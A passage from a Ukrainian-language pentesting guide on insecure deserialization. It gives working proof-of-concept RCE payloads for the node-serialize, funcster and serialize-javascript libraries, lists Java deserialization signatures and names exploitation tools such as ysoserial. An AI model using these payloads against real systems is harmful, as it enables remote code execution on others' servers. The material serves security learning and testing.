–¶—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –¥–æ–∑–≤–æ–ª—è—î —Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó. –ü—Ä–∏–∫–ª–∞–¥:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**–°–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –æ–±'—î–∫—Ç** –≤–∏–≥–ª—è–¥–∞—Ç–∏–º–µ —Ç–∞–∫:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤ –ø—Ä–∏–∫–ª–∞–¥—ñ, —â–æ –∫–æ–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—è —Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è, –¥–æ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ –¥–æ–¥–∞—î—Ç—å—Å—è –ø—Ä–∞–ø–æ—Ä–µ—Ü—å `_$$ND_FUNC$$_`.

–í—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É `node-serialize/lib/serialize.js` –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–π –∂–µ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å —ñ —è–∫ –∫–æ–¥ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

–Ø–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –≤ –æ—Å—Ç–∞–Ω–Ω—å–æ–º—É —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ñ –∫–æ–¥—É, **—è–∫—â–æ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å –∑–Ω–∞–π–¥–µ–Ω–æ**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `eval` –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–æ–º—É –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É **–≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó `eval`**.

–û–¥–Ω–∞–∫, **–ø—Ä–æ—Å—Ç–æ —Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏** —Ñ—É–Ω–∫—Ü—ñ—é **–Ω–µ –≤–∏–∫–æ–Ω–∞—î —ó—ó**, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, —â–æ–± —è–∫–∞—Å—å —á–∞—Å—Ç–∏–Ω–∞ –∫–æ–¥—É **–≤–∏–∫–ª–∏–∫–∞–ª–∞ `y.rce`** –≤ –Ω–∞—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, —ñ —Ü–µ –≤–∫—Ä–∞–π **–º–∞–ª–æ–π–º–æ–≤—ñ—Ä–Ω–æ**.\
–£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É, –≤–∏ –º–æ–≥–ª–∏ –± –ø—Ä–æ—Å—Ç–æ **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –æ–±'—î–∫—Ç**, **–¥–æ–¥–∞–≤—à–∏ –¥–µ—è–∫—ñ –¥—É–∂–∫–∏**, —â–æ–± –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é, –∫–æ–ª–∏ –æ–±'—î–∫—Ç –±—É–¥–µ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ.\
–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ñ –∫–æ–¥—É **–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –æ—Å—Ç–∞–Ω–Ω—é –¥—É–∂–∫—É** —ñ —è–∫ —Ñ—É–Ω–∫—Ü—ñ—è `unserialize` –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω–∞—î –∫–æ–¥:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
–Ø–∫ –±—É–ª–æ –∑–∞–∑–Ω–∞—á–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, —Ü—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –æ—Ç—Ä–∏–º–∞—î –∫–æ–¥ –ø—ñ—Å–ª—è `_$$ND_FUNC$$_` —ñ **–≤–∏–∫–æ–Ω–∞—î –π–æ–≥–æ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `eval`. –¢–æ–º—É, —â–æ–± **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–¥–∞–ª–∏—Ç–∏ —á–∞—Å—Ç–∏–Ω—É —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó** —Ç–∞ –æ—Å—Ç–∞–Ω–Ω—é –¥—É–∂–∫—É —ñ **–ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ JS –æ–¥–Ω–æ–ª—ñ–Ω—ñ–π–Ω–∏–∫** —è–∫ —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
–í–∏ –º–æ–∂–µ—Ç–µ [**–∑–Ω–∞–π—Ç–∏ —Ç—É—Ç**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **–¥–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –ø—Ä–æ —Ç–µ, —è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.

### [funcster](https://www.npmjs.com/package/funcster)

–ü–æ–º—ñ—Ç–Ω–∏–º –∞—Å–ø–µ–∫—Ç–æ–º **funcster** —î –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ñ—Å—Ç—å **—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤**; –≤–æ–Ω–∏ –≤–∏—Ö–æ–¥—è—Ç—å –∑–∞ –º–µ–∂—ñ –¥–æ—Å—Ç—É–ø–Ω–æ—ó –æ–±–ª–∞—Å—Ç—ñ. –¶–µ –æ–±–º–µ–∂–µ–Ω–Ω—è –∑–∞–ø–æ–±—ñ–≥–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—é –∫–æ–¥—É, —è–∫–∏–π –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –º–µ—Ç–æ–¥–∏ –Ω–∞ –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö –æ–±'—î–∫—Ç–∞—Ö, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫–ª—é—á–µ–Ω—å, —Ç–∞–∫–∏—Ö —è–∫ `"ReferenceError: console is not defined"` –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ –∫–æ–º–∞–Ω–¥, —Ç–∞–∫–∏—Ö —è–∫ `console.log()` –∞–±–æ `require(something)`.

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è, –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ –≥–ª–æ–±–∞–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É, –≤–∫–ª—é—á–∞—é—á–∏ –≤—Å—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –≤–±—É–¥–æ–≤–∞–Ω—ñ –æ–±'—î–∫—Ç–∏, –º–æ–∂–ª–∏–≤–µ —á–µ—Ä–µ–∑ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≥–ª–æ–±–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ, –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–æ—Å—Ç—É–ø –º–æ–∂–Ω–∞ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**–î–ª—è**[ **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ –¥–∂–µ—Ä–µ–ª–æ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

–ü–∞–∫–µ—Ç **serialize-javascript** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –≤–∏–∫–ª—é—á–Ω–æ –¥–ª—è —Ü—ñ–ª–µ–π —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, –Ω–µ –º–∞—é—á–∏ –∂–æ–¥–Ω–∏—Ö –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –Ω–µ—Å—É—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω—ñ—Å—Ç—å –∑–∞ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—é –≤–ª–∞—Å–Ω–æ–≥–æ –º–µ—Ç–æ–¥—É –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –ü—Ä—è–º–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `eval` –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è –æ—Ñ—ñ—Ü—ñ–π–Ω–∏–º –ø—Ä–∏–∫–ª–∞–¥–æ–º –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
–Ø–∫—â–æ —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ **–ª–µ–≥–∫–æ —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**–î–ª—è**[ **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ –¥–∂–µ—Ä–µ–ª–æ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞

–ù–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —Å—Ç–æ—Ä—ñ–Ω–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ç–µ, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –±—ñ–±–ª—ñ–æ—Ç–µ–∫–æ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

–£ Java, **–∑–≤–æ—Ä–æ—Ç–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**. –¶–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏, —è–∫—ñ —Å—Ç–≤–æ—Ä—é—é—Ç—å —à–∫—ñ–¥–ª–∏–≤—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å —Ü—ñ –∑–≤–æ—Ä–æ—Ç–Ω—ñ –≤–∏–∫–ª–∏–∫–∏, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–∏—Ö –¥—ñ–π.

### –í—ñ–¥–±–∏—Ç–∫–∏

#### –ë—ñ–ª–∏–π —è—â–∏–∫

–©–æ–± –≤–∏—è–≤–∏—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ –∫–æ–¥–æ–≤—ñ–π –±–∞–∑—ñ, —à—É–∫–∞–π—Ç–µ:

* –ö–ª–∞—Å–∏, —è–∫—ñ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å `Serializable`.
* –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π `java.io.ObjectInputStream`, `readObject`, `readUnshared`.

–ó–≤–µ—Ä–Ω—ñ—Ç—å –æ—Å–æ–±–ª–∏–≤—É —É–≤–∞–≥—É –Ω–∞:

* `XMLDecoder`, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–º–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏.
* –ú–µ—Ç–æ–¥ `fromXML` –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ `XStream`, –æ—Å–æ–±–ª–∏–≤–æ —è–∫—â–æ –≤–µ—Ä—Å—ñ—è XStream –º–µ–Ω—à–∞ –∞–±–æ –¥–æ—Ä—ñ–≤–Ω—é—î 1.46, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –ø—ñ–¥–ª—è–≥–∞—î –ø—Ä–æ–±–ª–µ–º–∞–º —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
* `ObjectInputStream` —É –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ –º–µ—Ç–æ–¥–æ–º `readObject`.
* –†–µ–∞–ª—ñ–∑–∞—Ü—ñ—é –º–µ—Ç–æ–¥—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `readObject`, `readObjectNodData`, `readResolve` –∞–±–æ `readExternal`.
* `ObjectInputStream.readUnshared`.
* –ó–∞–≥–∞–ª—å–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `Serializable`.

#### –ß–æ—Ä–Ω–∏–π —è—â–∏–∫

–î–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è —á–æ—Ä–Ω–æ–≥–æ —è—â–∏–∫–∞ —à—É–∫–∞–π—Ç–µ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ **–ø—ñ–¥–ø–∏—Å–∏ –∞–±–æ "Magic Bytes"**, —è–∫—ñ –ø–æ–∑–Ω–∞—á–∞—é—Ç—å java —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –æ–±'—î–∫—Ç–∏ (–ø–æ—Ö–æ–¥—è—Ç—å –∑ `ObjectInputStream`):

* –®—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π —à–∞–±–ª–æ–Ω: `AC ED 00 05`.
* Base64 —à–∞–±–ª–æ–Ω: `rO0`.
* HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ `Content-type`, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º –Ω–∞ `application/x-java-serialized-object`.
* –®—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π —à–∞–±–ª–æ–Ω, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—î —Å—Ç–∏—Å–Ω–µ–Ω–Ω—è: `1F 8B 08 00`.
* Base64 —à–∞–±–ª–æ–Ω, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—î —Å—Ç–∏—Å–Ω–µ–Ω–Ω—è: `H4sIA`.
* –í–µ–±-—Ñ–∞–π–ª–∏ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º `.faces` —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `faces.ViewState`. –í–∏—è–≤–ª–µ–Ω–Ω—è —Ü–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ —É –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É –ø–æ–≤–∏–Ω–Ω–æ —Å–ø–æ–Ω—É–∫–∞—Ç–∏ –¥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ [–ø–æ—Å—Ç—ñ –ø—Ä–æ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–π

–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –ø—Ä–∞—Ü—é—î –µ–∫—Å–ø–ª–æ–π—Ç Java Deserialized**, –≤–∞–º —Å–ª—ñ–¥ –æ–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—è –∑ [**–û—Å–Ω–æ–≤–Ω–æ—é –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é Java**](basic-java-deserialization-objectinputstream-readobject.md), [**–î–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é DNS Java**](java-dns-deserialization-and-gadgetprobe.md) —Ç–∞ [**Payload CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤ –±—ñ–ª–æ–º—É —è—â–∏–∫—É

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –±—É–¥—å-—è–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫ –∑ –≤—ñ–¥–æ–º–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—Å—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**, —è–∫—ñ –≤—ñ–¥–æ–º—ñ —è–∫ –≤—Ä–∞–∑–ª–∏–≤—ñ —ñ –¥–ª—è —è–∫–∏—Ö [**Ysoserial**](https://github.com/frohoff/ysoserial) –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç. –ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, –≤–∫–∞–∑–∞–Ω—ñ –Ω–∞ [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) –¥–ª—è –ø–æ—à—É–∫—É –º–æ–∂–ª–∏–≤–∏—Ö –ª–∞–Ω—Ü—é–≥—ñ–≤ –≥–∞–¥–∂–µ—Ç—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.\
–ü—Ä–∏ –∑–∞–ø—É—Å–∫—É **gadgetinspector** (–ø—ñ—Å–ª—è –π–æ–≥–æ –∑–±—ñ—Ä–∫–∏) –Ω–µ –∑–≤–µ—Ä—Ç–∞–π—Ç–µ —É–≤–∞–≥–∏ –Ω–∞ –±–µ–∑–ª—ñ—á –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω—å/–ø–æ–º–∏–ª–æ–∫, —è–∫—ñ –≤—ñ–Ω –ø—Ä–æ—Ö–æ–¥–∏—Ç—å, —ñ –¥–∞–π—Ç–µ –π–æ–º—É –∑–∞–∫—ñ–Ω—á–∏—Ç–∏. –í—ñ–Ω –∑–∞–ø–∏—à–µ –≤—Å—ñ –∑–Ω–∞—Ö—ñ–¥–∫–∏ –ø—ñ–¥ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. –ë—É–¥—å –ª–∞—Å–∫–∞, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **gadgetinspector –Ω–µ —Å—Ç–≤–æ—Ä–∏—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç —ñ –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —Ö–∏–±–Ω–æ–ø–æ–∑–∏—Ç–∏–≤–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏**.

#### –ß–æ—Ä–Ω–∏–π —è—â–∏–∫

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), –≤–∏ –º–æ–∂–µ—Ç–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ **—è–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ** (—ñ –Ω–∞–≤—ñ—Ç—å –≤–µ—Ä—Å—ñ—ó). –ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –º–æ–∂–µ –±—É—Ç–∏ **–ª–µ–≥—à–µ –≤–∏–±—Ä–∞—Ç–∏ payload** –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.\
[**–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe –∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω–∏–π –Ω–∞ **`ObjectInputStream` –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è—Ö**.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), –≤–∏ –º–æ–∂–µ—Ç–µ **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**, —è–∫—ñ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é ysoserial, —ñ **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏** —ó—Ö.\
